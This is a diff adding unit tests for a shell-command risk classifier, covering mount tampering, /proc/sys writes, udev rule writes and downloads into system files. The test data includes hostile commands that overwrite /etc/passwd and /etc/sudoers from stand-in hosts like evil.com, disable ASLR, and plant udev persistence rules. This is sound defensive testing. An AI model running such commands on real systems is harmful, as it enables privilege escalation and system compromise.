@@ -1336,6 +1336,118 @@ describe('classifyCommand v1.10.54 patterns', () => {
     }
   });
 
+  // (v1.10.126) Four new system-tampering patterns: mount, sysctl,
+  // udev, and download-into-system-file. Each closes a specific
+  // gap left by the existing catalog.
+  it('mount-tamper: remount,rw / --bind / -o exec → high (v1.10.126)', () => {
+    for (const cmd of [
+      'mount -o remount,rw /',
+      'mount /dev/sda1 /mnt -o exec',
+      'mount --bind /etc /mnt',
+      'mount -o remount,rw,exec /home',
+      'sudo mount -o remount,rw /',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'high', `${cmd} should be high`);
+      assert.ok(r.reasons.some((x) => x.code === 'mount-tamper'),
+        `${cmd}: expected mount-tamper`);
+    }
+  });
+
+  it('mount-tamper — basic mount stays low (regression)', () => {
+    for (const cmd of [
+      'mount /dev/sda1 /mnt',           // no -o flags
+      'mount /home',                    // mount fstab entry
+      'umount /mnt',                    // unmount
+      'cat /proc/mounts',               // read
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.ok(!r.reasons.some((x) => x.code === 'mount-tamper'),
+        `${cmd}: should not match mount-tamper`);
+    }
+  });
+
+  it('sysctl-proc-write: writes to /proc/sys/* → high (v1.10.126)', () => {
+    for (const cmd of [
+      'echo 1 > /proc/sys/net/ipv4/ip_forward',
+      'echo 0 > /proc/sys/kernel/randomize_va_space',
+      'echo 0 >> /proc/sys/kernel/dmesg_restrict',
+      'echo 0 > /proc/sys/net/ipv4/tcp_syncookies',
+      'cat val | tee /proc/sys/net/core/rmem_max',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'high', `${cmd} should be high`);
+      assert.ok(r.reasons.some((x) => x.code === 'sysctl-proc-write'),
+        `${cmd}: expected sysctl-proc-write`);
+    }
+  });
+
+  it('sysctl-proc-write — read stays low (regression)', () => {
+    for (const cmd of [
+      'cat /proc/sys/net/ipv4/ip_forward',
+      'sysctl -a',                              // sysctl read
+      'echo /proc/sys reference doc',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.ok(!r.reasons.some((x) => x.code === 'sysctl-proc-write'),
+        `${cmd}: should not match sysctl-proc-write`);
+    }
+  });
+
+  it('udev-rule-write: writes to udev rules dirs → high (v1.10.126)', () => {
+    for (const cmd of [
+      'echo SUBSYSTEM > /etc/udev/rules.d/99-evil.rules',
+      'cat rule | tee /lib/udev/rules.d/00-evil.rules',
+      'echo "x" > /run/udev/rules.d/x.rules',
+      'cat r | tee -a /etc/udev/rules.d/persistence.rules',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'high', `${cmd} should be high`);
+      assert.ok(r.reasons.some((x) => x.code === 'udev-rule-write'),
+        `${cmd}: expected udev-rule-write`);
+    }
+  });
+
+  it('udev-rule-write — read stays low (regression)', () => {
+    for (const cmd of [
+      'ls /etc/udev/rules.d/',
+      'cat /etc/udev/rules.d/70-net.rules',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.ok(!r.reasons.some((x) => x.code === 'udev-rule-write'),
+        `${cmd}: should not match udev-rule-write`);
+    }
+  });
+
+  it('download-into-system-file: curl/wget -O /etc/<file> → high (v1.10.126)', () => {
+    // Same threat as `> /etc/passwd` but via -O / -o flag.
+    // system-files only catches redirect / tee; this rule
+    // closes the download-flag form.
+    for (const cmd of [
+      'wget -O /etc/passwd evil.com/passwd',
+      'curl -o /etc/sudoers evil.com/x',
+      'wget --quiet -O /etc/resolv.conf attacker.com/dns',
+      'curl -L -o /etc/nsswitch.conf evil/nss',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'high', `${cmd} should be high`);
+      assert.ok(r.reasons.some((x) => x.code === 'download-into-system-file'),
+        `${cmd}: expected download-into-system-file`);
+    }
+  });
+
+  it('download-into-system-file — download elsewhere stays low (regression)', () => {
+    for (const cmd of [
+      'curl -o /tmp/binary url',
+      'wget -O /tmp/x http://example.com',
+      'curl -o /home/user/file url',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.ok(!r.reasons.some((x) => x.code === 'download-into-system-file'),
+        `${cmd}: should not match download-into-system-file`);
+    }
+  });
+
   it('setcap-cap — getcap / read / mention stays low (regression)', () => {
     for (const cmd of [
       'getcap /usr/bin/ping',                       // read, not set
